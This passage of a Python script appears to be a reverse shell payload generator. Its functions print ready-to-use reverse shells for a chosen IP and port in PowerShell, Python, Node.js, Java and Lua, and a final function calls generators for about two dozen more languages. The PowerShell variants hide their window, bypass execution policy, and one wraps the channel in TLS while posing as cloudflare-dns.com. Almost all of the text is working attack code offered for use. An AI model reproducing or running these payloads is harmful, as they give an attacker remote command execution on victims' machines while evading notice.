    print("""\n\n----------------------------------\n # Powershell #2 \n\npowershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('""" + ip + """',""" + str(port) + """);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" """)
    print("""\n\n----------------------------------\n # Powershell #3 \n\npowershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('""" + ip + """', """ + str(port) + """);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()" """)
    print("""\n\n----------------------------------\n # Powershell #4 (TLS) \n\npowershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('""" + ip + """', """ + str(port) + """);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()" """)

def python_windows_shell(ip, port, shells):
    print('''\n\n----------------------------------\n # Python3 Windows \n\nimport os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("''' + ip + '''",''' + str(port) + '''))

p=subprocess.Popen(["''' + shells + '''"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()''')

def nodeJS2(ip, port, shells):
    print("""\n----------------------------------\n # node.js #2 \n\n(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn(""" + str('''"''') + shells + str('''"''') + """, []);
    var client = new net.Socket();
    client.connect(""" + str(port) + """, """ + str('''"''') + ip + str('''"''') + """, function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();""")

def java3(ip, port, shells):
    print("""\n\n----------------------------------\n # Java #3 \n\nimport java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = """ + str('''"''') + ip + str('''"''') + """;
        int port = """ + str(port) + """;
        String cmd = """ + str('''"''') + shells + str('''"''') + """;
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}""")

def lua2(ip, port):
    print('''\n\n----------------------------------\n # Lua #2 \n\nlua5.1 -e 'local host, port = "''' + ip + '''", ''' + str(port) + ''' local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' ''')

def alls(ip, port, shells):
    main(ip, port, shells)
    bash(ip, port, shells)
    nc(ip, port, shells)
    C(ip, port, shells)
    CSharp(ip, port, shells)
    haskell(ip, port, shells)
    perl(ip, port, shells)
    PHP(ip, port, shells)
    python_shell(ip, port, shells)
    ruby(ip, port, shells)
    socat(ip, port, shells)
    nodeJS(ip, port, shells)
    java(ip, port, shells)
    Javascript(ip, port, shells)
    Groovy(ip, port, shells)
    telnet(ip, port, shells)
    zsh(ip, port, shells)
    lua(ip, port, shells)
    Golang(ip, port, shells)
    Vlang(ip, port, shells)
    Awk(ip, port, shells)
    Dart(ip, port, shells)
    powershell(ip, port, shells)